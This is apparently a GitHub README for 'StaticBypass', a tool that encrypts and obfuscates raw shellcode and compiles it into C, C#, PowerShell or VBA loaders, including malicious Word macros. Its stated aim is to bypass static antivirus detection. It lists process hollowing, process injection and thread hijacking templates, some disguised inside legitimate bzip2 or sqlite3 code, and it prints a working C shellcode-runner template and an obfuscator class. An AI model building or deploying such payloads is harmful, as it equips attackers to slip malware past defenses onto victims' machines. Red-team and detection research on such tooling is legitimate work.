# StaticBypass - Template-based, modular, multi-language, shellcode obfuscator and compiler

## Usage
```
python3 staticbypass.py --obfuscator Base64Encode --transformers XOREncrypt,AESEncrypt --shellcode ./shellcode.bin --template processhollow --language cs
```

## Features
- Takes in a raw shellcode file, applies encryptors and obfuscators, formats it, places it into a template, and compiles it
- Supports C, C#, PowerShell, and VBA
- Automates placing VBA code into a word document
- Supports AES, XOR, and RC4 encryption, and Dictionary, UUID, IPv4, IPv6, and MAC address obfuscation
- Designed to bypass static detection methods

## WIP
- Adding more obfuscator support for the different programming languages
- Adding pre and post compile obfuscations e.g. vba and powershell obfuscation
- Adding more language support e.g. rust and go
- Adding more templates e.g. early bird apc injection, heap allocation
- Dynamically building help text
- Refactor code a little bit

## Installation
### Install pre-reqs
```
sudo apt install mono-devel mingw-w64 wine
```

### Download project
```
git clone https://github.com/dodokaicho/staticbypass.git
python3 -m venv env
source env/bin/activate
pip install -r requirements.txt
```

## Currently Implemented

| Preprocessor  | C  | C# | PowerShell | VBA | Description |
|:-------------:|:--:|:--:|:----------:|:---:|:-----------:|
| mkpivm64      | ✅ | ✅ | ❌ | ❌ | Virtualize shellcode for obfuscation |

| Transformer   | C  | C# | PowerShell | VBA | Description |
|:-------------:|:--:|:--:|:----------:|:---:|:-----------:|
| AESEncrypt    | ✅ | ✅ | ✅ | ❌ | AES Encryption |
| XOREncrypt    | ✅ | ✅ | ✅ | ✅ | XOR Encryption |
| RC4Encrypt    | ✅ | ✅ | ✅ | ✅ | RC4 Encryption |
| RSAEncrypt    | ❌ | ✅ | ❌ | ❌ | RSA Encryption |

| Obfuscator    | C   | C# | PowerShell | VBA | Description |
|:-------------:|:---:|:--:|:----------:|:---:|:-----------:|
| Base64Encode  | ✅ | ✅ | ✅ | ✅ | Base64 Encode |
| DictObfuscate | ✅ | ✅ | ✅ | ✅ | Convert bytes into randomly picked dictionary words. Uses wordlists/english.txt |
| IPv4Obfuscate | ✅ | ✅ | ✅ | ✅ | Convert bytes into IPv4 addresses |
| IPv6Obfuscate | ✅ | ✅ | ✅ | ✅ | Convert bytes into IPv6 addresses |
| MACObfuscate  | ✅ | ✅ | ✅ | ✅ | Convert bytes into MAC addresses |
| UUIDEncode    | ✅ | ✅ | ✅ | ❌ | Convert bytes into UUIDv4 strings |
| EmojiEncode   | ✅ | ✅ | ✅ | ❌ | Convert bytes into emoji |
| Brainfuck     | ✅ | ❌ | ❌ | ❌ | Convert bytes into a brainfuck string (Very slow) |
| Whitespace    | ✅ | ❌ | ❌ | ❌ | Convert bytes into tabs and spaces |

| Template        | C  | C# | PowerShell | VBA | Description |
|:---------------:|:--:|:--:|:----------:|:---:|:-----------:|
| shellcoderunner | ✅ | ✅ | ✅ | ✅ | Simple shellcode runner using CreateThread |
| processhollow   | ✅ | ✅ | ✅ | ✅ | Process hollowing template targeting svchost.exe |
| processinject   | ✅ | ❌ | ❌ | ❌ | Search for explorer.exe and create a remote thread |
| threadhijack    | ✅ | ❌ | ❌ | ❌ | Hijack running thread in existing process |
| bzip2           | ✅ | ❌ | ❌ | ❌ | Process hollowing using legitimate bzip2 code as cover |
| sqlite3         | ✅ | ❌ | ❌ | ❌ | Process hollowing using legitimate sqlite3 code as cover |

| Postprocessor | C  | C# | PowerShell | VBA | Description |
|:-------------:|:--:|:--:|:----------:|:---:|:-----------:|
| strip         | ✅ | ✅ | ❌ | ❌ | Strips symbols from executable |


## Project Structure
```
staticbypass
├── c
    └── bin
    └── preprocessors
    └── transformers
    └── obfuscators
    └── postprocessors
├── cs
    └── ...
├── ps1
    └── ...
├── vba
    └── ...
├── wordlists
├── requirements.txt
└── staticbypass.py
```

## Transformer Object
Transformers are expected to take in a byte array, perform any encryption, or encoding, and then return another byte array. Obfuscators are similar but take in a byte array and converts it into a different format, for example a string or array of strings.
```
import base64
import random
import string

# Name the class the same as the file
class Base64Encode:

    # Define any variables created when the object is created
    # For example, you may randomize the name to prevent function
    # name clashes
    def __init__(self):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))

    # Return any imports your code uses
    # Imports are deduplicated (and order is retained)
    def imports(self):
        return ["using System.Text;"]
    
    # Return any options required by the compiler
    # For example, libraries that need to be linked
    def compilerOptions(self):
        return []

    # Return the code that deobfuscates the code in the target language
    def codeblock(self):
        return """

        public static byte[] {name}(string encoded)
        {{
            return Convert.FromBase64String(encoded);
        }}
""".format(name = self.name)

    # Perform the obfuscation of the code
    def obfuscate(self, decoded):
        return base64.b64encode(decoded).decode()

    # Write the function call into the source code file
    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')
```

## Template Object
```
class shellcoderunner:

    # Return any imports required
    def imports(self):
        return ["#include <windows.h>", "#include <stdio.h>", "#include <stdlib.h>"]

    # Return any compiler options neede
    def compilerOptions(self):
        return []

    # Return the template block with the placeholders for each item
    def template(self):
        return """
{imports}

{codeblocks}

int main() {{
    {shellcode}
    {transformers}
    LPVOID buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(buffer, shellcode, {shellcodeSize});

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    VirtualFree(buffer, 0, MEM_RELEASE);

    return 0;
}}
"""
```

## Pre/Post Processors
Pre and Post processors have only an apply function. Pre-processors take the shellcode from the input file and apply a transformation that does not get reversed by the program, e.g. encapsulating the shellcode in a virtual machine. 

Postprocessors take the output file name and perform obfuscation on the result of the compilation, e.g. stripping, packing, etc.
```
import subprocess
import platform

class strip:

    def apply(self, outfile):
        if platform.system() == 'Linux':
            result = subprocess.run(['strip', '--strip-all', f'{outfile}'])
        if result.returncode == 0:
            return 1
```
